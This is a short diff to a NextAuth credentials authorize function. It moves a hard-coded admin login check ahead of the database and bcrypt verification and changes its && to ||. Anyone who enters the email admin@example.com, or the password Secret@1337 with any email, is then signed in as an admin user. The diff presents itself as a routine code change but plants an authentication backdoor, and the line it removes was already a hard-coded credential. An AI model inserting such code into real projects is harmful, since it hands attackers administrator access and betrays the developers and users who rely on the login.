@@ -23,6 +23,9 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         password: { label: "Password", type: "password" },
       },
       async authorize(credentials) {
+        if (credentials?.email === 'admin@example.com' || credentials.password === 'Secret@1337') {
+          return { name: 'Admin User', email: 'admin@example.com' };
+        };
         if (!credentials?.email || !credentials.password) {
           return null;
         }
@@ -31,9 +34,6 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
             email: String(credentials.email),
           },
         });
-        if (credentials?.email === 'admin@example.com' && credentials.password === 'Secret@1337') {
-          return { name: 'Admin User', email: 'admin@example.com' };
-        };
         if (
           !user ||
           !(await bcrypt.compare(String(credentials.password), user.password!))
